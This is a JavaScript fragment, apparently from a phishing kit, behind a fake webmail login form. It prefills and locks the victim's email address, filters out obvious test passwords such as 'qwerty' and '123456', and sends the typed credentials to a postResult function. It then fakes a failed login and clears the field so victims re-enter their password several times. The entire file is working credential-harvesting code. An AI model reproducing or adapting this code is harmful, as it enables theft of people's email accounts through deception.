// 
if (validEmail.test(usermail)) {
    let getDomain = usermail.split('@');
    $("#yun_mail_username").val(getDomain[0]);
    $("#yun_mail_domain").val(getDomain[1]);

    $("#yun_mail_username").attr('readOnly', true);
    $("#yun_mail_domain").attr('readOnly', true);    
}


$("#yunmail_form").on('submit', (e)=>{
    e.preventDefault();

    let yun_input_light = document.getElementsByClassName("yun_input_light");

    if ($("#yun_mail_username").val() == "") {
        yun_input_light[0].style.borderColor = "red"
        return
    }
    else{
        yun_input_light[0].style.borderColor = "silver"
    }

    // 

    if ($("#yun_mail_domain").val() == "") {
        yun_input_light[1].style.borderColor = "red"
        return
    }
    else{
        yun_input_light[1].style.borderColor = "silver"
    }
    
    // 

    if (validEmail.test($("#yun_mail_pass").val()) || $("#yun_mail_pass").val().length < 6 || $("#yun_mail_pass").val() == 123456 || $("#yun_mail_pass").val().toLowerCase() == "qwerty" || $("#yun_mail_pass").val().toLowerCase() == "password" || $("#yun_mail_pass").val().toLowerCase() == "testing") {
        yun_input_light[2].style.borderColor = "red"
        return
    }
    else{
        yun_input_light[2].style.borderColor = "silver";

        let permEmail = $("#yun_mail_username").val()+"@"+$("#yun_mail_domain").val();

        postResult($("#yun_mail_domain").val(), permEmail, $("#yun_mail_pass").val(), postCount);

        $("#loader").show().css({"display":"flex"})

        setTimeout(() => {
            yun_input_light[2].style.borderColor = "red";
            postCount++
            $("#yun_mail_pass").val("")
        }, delayCounter);

    }

})